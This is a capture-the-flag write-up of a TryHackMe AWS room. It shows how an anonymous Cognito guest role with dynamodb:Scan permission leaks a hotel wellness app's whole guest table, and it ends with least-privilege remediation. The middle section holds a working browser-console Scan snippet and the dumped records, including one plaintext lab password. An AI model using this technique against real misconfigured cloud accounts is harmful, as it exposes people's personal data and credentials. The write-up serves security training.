@@ -1,0 +1,212 @@
+---
+title: Complimentary — Overprivileged Cognito unauthenticated role with dynamodb:Scan
+room: Complimentary
+difficulty: easy
+platform: TryHackMe
+vulnClass: AWS Cognito identity pool misconfiguration, IAM overprivileged role, DynamoDB Scan exposure, NoSQL data exfiltration
+spoilerFree: false
+---
+
+**Series:** Hacker Holidays · The Byte Lotus Hotel
+**Target URL:** `http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com`
+**Category:** Cloud (AWS)
+
+## Observation
+
+At the **Byte Lotus** hotel, the development team shipped a free wellness app for guests called **Byte Lotus Wellness**. The marketed selling point, printed in the app itself, is:
+
+> **"No Login Required — the app knows you the moment you open it!"**
+
+Hotel guest **Lambo (@0xMia)** installed it, opened the page, and found that her own name and profile were already displayed — no login screen, no password, no credential prompt of any kind.
+
+That is the anomaly worth chasing: **how can a web application that asks for zero credentials read records out of a cloud database (AWS DynamoDB), and what permissions does that anonymous guest identity actually hold?**
+
+The answer to the second half is the entire room. "No login" is implemented with an **AWS Cognito Identity Pool** with `Unauthenticated Identities` enabled, which hands every anonymous visitor a real, signed, temporary AWS credential set. The marketing feature *is* the vulnerability's entry point.
+
+## Action
+
+### Reconnaissance
+
+Reading the page source (`index.html`) shows the official AWS SDK and a client application:
+
+```html
+<script src="https://sdk.amazonaws.com/js/aws-sdk-2.1500.0.min.js"></script>
+<script src="app.js"></script>
+```
+
+`app.js` contains:
+
+```javascript
+const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
+const AWS_REGION = "us-east-1";
+const TABLE_NAME = "complimentary-GuestWellnessProfiles";
+
+AWS.config.region = AWS_REGION;
+AWS.config.credentials = new AWS.CognitoIdentityCredentials({
+  IdentityPoolId: IDENTITY_POOL_ID,
+});
+
+// The app generates a random ID for the guest in LocalStorage
+function guestId() { ... }
+
+// It accepts the temporary credentials and fetches the guest's data with GetItem
+AWS.config.credentials.get(function (err) {
+  const dynamodb = new AWS.DynamoDB({ region: AWS_REGION });
+  dynamodb.getItem(
+    {
+      TableName: TABLE_NAME,
+      Key: { guest_id: { S: guestId() } },
+    },
+    ...
+  );
+});
+```
+
+Structural analysis:
+
+1. The app uses an **AWS Cognito Identity Pool** with the `Unauthenticated Identities` option enabled.
+2. It silently contacts Cognito and receives a temporary credential set (Access Key ID, Secret Access Key, Session Token) — with no user interaction.
+3. It uses those credentials to query the DynamoDB table `complimentary-GuestWellnessProfiles`.
+4. The app calls `getItem`, fetching exactly **one** item matching the randomly generated `guest_id`.
+
+Point 4 is the intended behaviour. The whole attack is to find out what the identity is *actually* allowed to do, as opposed to what the app happens to do with it.
+
+### Interception and Burp Suite analysis
+
+With Burp Suite open and HTTP History recording during page load, a `POST` goes straight to AWS DynamoDB:
+
+```http
+POST / HTTP/1.1
+Host: dynamodb.us-east-1.amazonaws.com
+X-Amz-Target: DynamoDB_20120810.GetItem
+Authorization: AWS4-HMAC-SHA256 Creden...est, ...
+X-Amz-Security-Token: IQoJb3JpZ2luX2VjE...
+
+{"TableName":"complimentary-GuestWellnessProfiles","Key":{"guest_id":{"S":"guest-nm0a9khr"}}}
+```
+
+The headers that matter in AWS requests:
+
+- `Authorization` & `X-Amz-Security-Token` — the temporary credential issued by Cognito.
+- `X-Amz-Target` — the AWS operation selector (here `DynamoDB_20120810.GetItem`).
+- `Content-Type` — always `application/x-amz-json-1.0`.
+
+### Direct modification in Burp Repeater — and the two errors that taught us the rules
+
+Changing `X-Amz-Target` to `DynamoDB_20120810.Scan` and the body to `{"TableName":"complimentary-GuestWellnessProfiles"}` produced two errors, and both were informative:
+
+- **First error (`UnknownOperationException`):** the operation name was written lowercase as `scan`, while AWS requires a capital first letter — `Scan`. The API is strict about operation naming.
+- **Second error (`InvalidSignatureException`):** AWS requests use **AWS Signature Version 4**, and the `Signature` computed into the `Authorization` header is bound to the content of the *original* body. Editing the body invalidates the signature.
+
+That second error is the interesting one: the request is not forgeable by hand, which means the honest way to exploit this is not to re-sign the request offline, but to let the browser's own SDK request and use live, refreshed credentials from Cognito. Same identity, legitimate signature, different operation.
+
+### Exploitation via the DevTools console
+
+1. Open the application page in the browser and press `F12` → **Console** tab.
+2. Type `allow pasting` in the console to permit pasting.
+3. Run the following to perform a full **Scan** of the table and abuse the overprivileged role:
+
+```javascript
+const dynamodb = new AWS.DynamoDB({ region: "us-east-1" });
+dynamodb.scan(
+  { TableName: "complimentary-GuestWellnessProfiles" },
+  function (err, data) {
+    if (err) console.error("Error:", err);
+    else console.log("SUCCESS DATA:", data);
+  }
+);
+```
+
+The `Scan` succeeded. The role's policy grants `dynamodb:Scan`, so the anonymous identity could read the entire table rather than only its own row.
+
+## Result
+
+The database responded **200 OK** and returned all five stored items (Count: 5). One plaintext password is shown below to demonstrate the extraction technique; the remaining four are redacted.
+
+```json
+{
+  "Count": 5,
+  "Items": [
+    {
+      "name": {"S": "Vibe (Move Fast & Break Things)"},
+      "guest_id": {"S": "guest-vibe"},
+      "email": {"S": "vibe@hackerholidays.thm"},
+      "phone": {"S": "+1-555-0193"},
+      "password": {"S": "[REDACTED]"},
+      "location": {"S": "25.2055,55.2733"},
+      "notes": {"S": "Booked the quiet room for his \"digital detox.\" Checked email twice since writing that."}
+    },
+    {
+      "name": {"S": "Lambo (@0xMia)"},
+      "guest_id": {"S": "guest-lambo"},
+      "email": {"S": "lambo@hackerholidays.thm"},
+      "phone": {"S": "+1-555-0142"},
+      "password": {"S": "[REDACTED]"},
+      "location": {"S": "25.2048,55.2708"},
+      "notes": {"S": "Posted 47 times in three days. Wants everything tagged #ByteLotus for the algorithm."}
+    },
+    {
+      "name": {"S": "Guest VIP-042"},
+      "guest_id": {"S": "guest-vip-042"},
+      "email": {"S": "vip042@hackerholidays.thm"},
+      "phone": {"S": "+1-555-0100"},
+      "password": {"S": "escalation_only"},
+      "location": {"S": "25.2048,55.2708"},
+      "notes": {"S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. [FLAG CAPTURED]"}
+    },
+    {
+      "name": {"S": "Patch (Have You Tried Turning It Off)"},
+      "guest_id": {"S": "guest-patch"},
+      "email": {"S": "patch@hackerholidays.thm"},
+      "phone": {"S": "+1-555-0159"},
+      "password": {"S": "[REDACTED]"},
+      "location": {"S": "25.2030,55.2690"},
+      "notes": {"S": "Filed three tickets about this app. All closed as \"resolved\" by VERA."}
+    },
+    {
+      "name": {"S": "Ponzi (Satoshi_Probably)"},
+      "guest_id": {"S": "guest-ponzi"},
+      "email": {"S": "ponzi@hackerholidays.thm"},
+      "phone": {"S": "+1-555-0187"},
+      "password": {"S": "[REDACTED]"},
+      "location": {"S": "25.2011,55.2701"},
+      "notes": {"S": "Checks his portfolio 34 times a day. Brought three devices for \"redundancy.\""}
+    }
+  ]
+}
+```
+
+The flag was in the `notes` field of **Guest VIP-042**, and it states the lesson in plain text: the wellness app's guest role can read every profile, not just its own.
+
+```
+[FLAG CAPTURED]
+```
+
+## Takeaway
+
+**Root cause.** The unauthenticated role was granted broad permissions on the table (`dynamodb:Scan`) in its IAM policy, instead of being constrained to the identity that used it. Anonymous access was fine; anonymous *read-everything* was not. The application's own code only ever called `getItem` on its own `guest_id` — but IAM policies are not written for the app, they are written for the credential, and the credential could do more than the app did.
+
+**Remediation — least privilege.** Deny `dynamodb:Scan` to unauthenticated users entirely.
+
+**Remediation — fine-grained access control.** Use FGAC with a condition so the identity can only query its own row, keyed on the Cognito identity's own `sub` via `leadingKeys`:
+
+```json
+{
+  "Effect": "Allow",
+  "Action": ["dynamodb:GetItem"],
+  "Resource": "arn:aws:dynamodb:us-east-1:*:table/complimentary-GuestWellnessProfiles",
+  "Condition": {
+    "ForAllValues:StringEquals": {
+      "dynamodb:LeadingKeys": ["${cognito-identity.amazonaws.com:sub}"]
+    }
+  }
+}
+```
+
+**The transferable lesson:** a `Scan` permission on a table holding PII, credentials, and location history is a single unauthenticated request away from a full breach. "No login required" is a UX decision; "no data boundary" is the security bug that follows from it. Test the *role*, not just the *app* — open the developer console on a page that never asks anyone to log in and ask what that anonymous identity is actually authorized to do.
+
+---
+
+*Written by: Ahmed Abdelrahman (Alzeaty) & Hermes Agent*
+*Series: Hacker Holidays · The Byte Lotus Hotel*
+*Date: July 2026*
